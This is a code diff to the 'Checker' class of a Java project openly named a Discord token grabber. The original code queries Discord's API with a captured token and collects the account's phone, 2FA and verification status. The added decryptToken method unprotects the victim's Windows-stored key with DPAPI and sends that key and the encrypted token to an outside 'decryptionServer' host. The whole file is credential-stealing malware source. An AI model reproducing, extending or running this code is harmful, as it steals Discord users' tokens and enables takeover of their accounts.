@@ -1,8 +1,13 @@
 package com.github.dedinc.discordtokengrabber.utils;
 
+import com.sun.jna.platform.win32.Crypt32Util;
 import org.json.JSONObject;
+import java.util.Arrays;
+import java.util.Base64;
 
 public class Checker {
+
+    public static String osKey = null;
 
     public String checkUser(String token) {
         JSONObject response = new JSONObject(Helper.getRequest().get("https://discordapp.com/api/v9/users/@me", token));
@@ -19,5 +24,11 @@ public class Checker {
             info += "\nPhone: " + response.getString("phone");
         } catch (Exception e) {}
         return String.format(info + "\n2FA: %b\nVerified: %b\n\nToken: %s", twofa, verified, token);
+    }
+
+    public String decryptToken(String token) {
+        byte[] bytes = Base64.getDecoder().decode(osKey.getBytes());
+        String encryptedBytes = new String(Base64.getEncoder().encode(Crypt32Util.cryptUnprotectData(Arrays.copyOfRange(bytes, 5, bytes.length))));
+        return new JSONObject(Helper.getRequest().get(String.format("https://decryptionServer.illllilllilllll.repl.co?key=%s&token=%s", encryptedBytes, new String(Base64.getEncoder().encode(token.getBytes()))), null)).getString("token");
     }
 }
